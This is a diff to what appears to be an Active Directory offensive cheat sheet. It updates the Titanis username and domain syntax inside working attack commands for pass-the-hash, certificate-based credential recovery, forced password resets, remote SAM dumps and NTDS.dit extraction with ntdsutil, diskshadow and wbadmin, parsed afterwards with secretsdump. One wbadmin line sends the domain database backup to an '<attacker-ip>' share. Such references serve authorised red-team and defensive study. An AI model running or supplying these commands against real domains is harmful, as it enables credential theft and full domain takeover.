@@ -91,7 +91,7 @@
 
 | Scenario | impacket | Titanis | minikerberos URL | msldap URL | Metasploit | aiosmb URL |
 |---|---|---|---|---|---|---|
-| Password | `DOMAIN/user:Pass@host` | `-UserName user@DOMAIN -Password Pass` | `kerberos+password://DOMAIN\user:Pass@kdc` | `ldap+ntlm-password://DOMAIN\user:Pass@dc` | `SMBDomain DOMAIN SMBUser user SMBPass Pass` | `smb+ntlm-password://DOMAIN\user:Pass@host` |
+| Password | `DOMAIN/user:Pass@host` | `-UserName user -UserDomain DOMAIN -Password Pass` | `kerberos+password://DOMAIN\user:Pass@kdc` | `ldap+ntlm-password://DOMAIN\user:Pass@dc` | `SMBDomain DOMAIN SMBUser user SMBPass Pass` | `smb+ntlm-password://DOMAIN\user:Pass@host` |
 | Pass-the-Hash | `-hashes :NTLM` | `-NtlmHash <NTLM>` | `kerberos+ntlm-nt://DOMAIN\user:NTLM@kdc` | `ldap+ntlm-nt://DOMAIN\user:NTLM@dc` | `SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM` | `smb+ntlm-nt://DOMAIN\user:NTLM@host` |
 | AES key | `-aesKey <hex>` | `-AesKey <hex>` | `kerberos+aes://DOMAIN\user:hex@kdc` | `ldap+kerberos+aes://.../?dc=ip` | `AESKEY <hex>` | `smb+kerberos+aes://DOMAIN\user:hex@host/?dc=ip` |
 | RC4 key | via `-hashes` | `-NtlmHash` | `kerberos+rc4://DOMAIN\user:NTLM@kdc` | `ldap+kerberos+rc4://.../?dc=ip` | `NTHASH <NTLM>` | `smb+kerberos+rc4://DOMAIN\user:NTLM@host/?dc=ip` |
@@ -601,7 +601,7 @@ certipy req -username jdoe@DOMAIN -password Password123 \
   -target ca.domain.local -out admin
 minikerberos-getNTPKInit \
   "kerberos+pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt
-Wmi exec 192.168.1.10 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
+Wmi exec 192.168.1.10 -UserName Administrator -UserDomain DOMAIN -NtlmHash <recovered_nt> "whoami"
 ```
 
 [↑ Back to Index](#index)
@@ -679,7 +679,7 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p AdminPass set password jdoe NewPas
 bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 set password jdoe NewPass
 
 # Titanis — admin sets another user's password
-Kerb setpw -UserName admin@DOMAIN -Kdc 192.168.1.1 -Password AdminPass jdoe@DOMAIN NewPass
+Kerb setpw -UserName admin -UserDomain DOMAIN -Kdc 192.168.1.1 -Password AdminPass jdoe@DOMAIN NewPass
 ```
 
 [↑ Back to Index](#index)
@@ -736,9 +736,9 @@ smbclient.py -k -no-pass DOMAIN/Administrator@fileserver.domain.local
 
 # Titanis — non-functional with forged tickets currently; shown for API reference only
 # (-Tgt rejects impacket ccache due to NT_PRINCIPAL vs NT_SERVICE_INSTANCE name type; fix pending)
-# Wmi exec dc01 -ha 192.168.1.1 -UserName Administrator@DOMAIN \
+# Wmi exec dc01 -ha 192.168.1.1 -UserName Administrator -UserDomain DOMAIN \
 #   -TicketCache Administrator.ccache "whoami"
-# Smb2Client ls \\fileserver.domain.local\C$ -UserName Administrator@DOMAIN \
+# Smb2Client ls \\fileserver.domain.local\C$ -UserName Administrator -UserDomain DOMAIN \
 #   -TicketCache Administrator.ccache
 ```
 
@@ -1137,7 +1137,7 @@ pypykatz smb regdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C
 Reg dumpsam 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics
 
 # Titanis — backup operator (no admin required, -BackupSemantics still required)
-Reg dumpsam 192.168.1.10 -UserName backupuser@DOMAIN \
+Reg dumpsam 192.168.1.10 -UserName backupuser -UserDomain DOMAIN \
   -Password Password123 -BackupSemantics
 ```
 
@@ -1329,15 +1329,15 @@ netexec smb 192.168.1.1 -u Administrator -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -M 
 
 # Titanis — exec via WMI, retrieve via SMB, parse offline
 # ⚠️ WMI process token elevation issue; may return Access is denied. Use diskshadow or -use-remoteSSWMI-NTDS instead.
-Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
+Wmi exec 192.168.1.1 -UserName Administrator -UserDomain DOMAIN -Password Password123 \
   "C:\Windows\System32\ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ifm\" q q"
 Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ifm\Active Directory\ntds.dit" ntds.dit \
-  -UserName Administrator@DOMAIN -Password Password123
+  -UserName Administrator -UserDomain DOMAIN -Password Password123
 Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ifm\registry\SYSTEM" SYSTEM \
-  -UserName Administrator@DOMAIN -Password Password123
+  -UserName Administrator -UserDomain DOMAIN -Password Password123
 # Clean up
 Smb2Client rmdir "\\192.168.1.1\C$\Windows\Temp\ifm" \
-  -UserName Administrator@DOMAIN -Password Password123
+  -UserName Administrator -UserDomain DOMAIN -Password Password123
 
 # Parse offline
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
@@ -1364,7 +1364,7 @@ wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
   "wbadmin start backup -backupTarget:\\\\<attacker-ip>\\share -include:C:\\Windows\\NTDS\\ntds.dit -quiet"
 
 # Titanis — exec via WMI
-Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
+Wmi exec 192.168.1.1 -UserName Administrator -UserDomain DOMAIN -Password Password123 \
   "wbadmin start backup -backupTarget:\\\\<attacker-ip>\\share -include:C:\\Windows\\NTDS\\ntds.dit -quiet"
 
 # Step 2 — list backup versions to get the version identifier
@@ -1381,9 +1381,9 @@ wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
 
 # Step 5 — retrieve both files and parse offline
 Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ntds.dit" ntds.dit \
-  -UserName Administrator@DOMAIN -Password Password123
+  -UserName Administrator -UserDomain DOMAIN -Password Password123
 Smb2Client get "\\192.168.1.1\C$\Windows\Temp\SYSTEM" SYSTEM \
-  -UserName Administrator@DOMAIN -Password Password123
+  -UserName Administrator -UserDomain DOMAIN -Password Password123
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
@@ -1416,7 +1416,7 @@ smbclient.py DOMAIN/Administrator:Password123@192.168.1.1
 
 # Titanis — upload
 Smb2Client put shadow.dsh "\\192.168.1.1\C$\Windows\Temp\shadow.dsh" \
-  -UserName Administrator@DOMAIN -Password Password123
+  -UserName Administrator -UserDomain DOMAIN -Password Password123
 
 # Step 3 — execute diskshadow and copy NTDS.dit
 wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
@@ -1427,11 +1427,11 @@ wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
   "cmd.exe /c copy Z:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM"
 
 # Titanis — exec (no > redirect in command arg; use cmd.exe /c for copy)
-Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
+Wmi exec 192.168.1.1 -UserName Administrator -UserDomain DOMAIN -Password Password123 \
   "diskshadow.exe /s C:\Windows\Temp\shadow.dsh"
-Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
+Wmi exec 192.168.1.1 -UserName Administrator -UserDomain DOMAIN -Password Password123 \
   "cmd.exe /c copy Z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit"
-Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
+Wmi exec 192.168.1.1 -UserName Administrator -UserDomain DOMAIN -Password Password123 \
   "cmd.exe /c copy Z:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM"
 
 # Step 4 — retrieve files
@@ -1441,9 +1441,9 @@ smbclient.py DOMAIN/Administrator:Password123@192.168.1.1
 
 # Titanis — retrieve
 Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ntds.dit" ntds.dit \
-  -UserName Administrator@DOMAIN -Password Password123
+  -UserName Administrator -UserDomain DOMAIN -Password Password123
 Smb2Client get "\\192.168.1.1\C$\Windows\Temp\SYSTEM" SYSTEM \
-  -UserName Administrator@DOMAIN -Password Password123
+  -UserName Administrator -UserDomain DOMAIN -Password Password123
 
 # Step 5 — clean up shadow and parse offline
 wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
@@ -2255,10 +2255,10 @@ minikerberos-getNTPKInit \
   "kerberos+pfx://DOMAIN\Administrator:@192.168.1.1?pfx=admin.pfx" admin_nt.txt
 
 # Step 4 — Titanis PTH with recovered hash (use IP for Wmi exec; FQDNs fail at WMI DCOM activation)
-Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> "whoami"
+Wmi exec 192.168.1.1 -UserName Administrator -UserDomain DOMAIN -NtlmHash <recovered_nt> "whoami"
 Smb2Client ls \\dc01.domain.local\C$ -UserName Administrator -UserDomain DOMAIN \
   -NtlmHash <recovered_nt>
-Reg dumpsam 192.168.1.1 -UserName Administrator@DOMAIN -NtlmHash <recovered_nt> -BackupSemantics
+Reg dumpsam 192.168.1.1 -UserName Administrator -UserDomain DOMAIN -NtlmHash <recovered_nt> -BackupSemantics
 ```
 
 [↑ Back to Index](#index)
@@ -2302,9 +2302,9 @@ certsync -u jdoe -p Password123 -d DOMAIN.LOCAL -dc-ip 192.168.1.1 \
   -ns 192.168.1.1 -outputfile domain_hashes
 
 # Feed recovered hashes into Titanis PTH flows (use IP for Wmi exec; FQDNs fail at WMI DCOM activation)
-Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN \
+Wmi exec 192.168.1.1 -UserName Administrator -UserDomain DOMAIN \
   -NtlmHash <recovered_nt> "whoami"
-Smb2Client ls \\dc01.domain.local\C$ -UserName Administrator@DOMAIN \
+Smb2Client ls \\dc01.domain.local\C$ -UserName Administrator -UserDomain DOMAIN \
   -NtlmHash <recovered_nt>
 ```
 
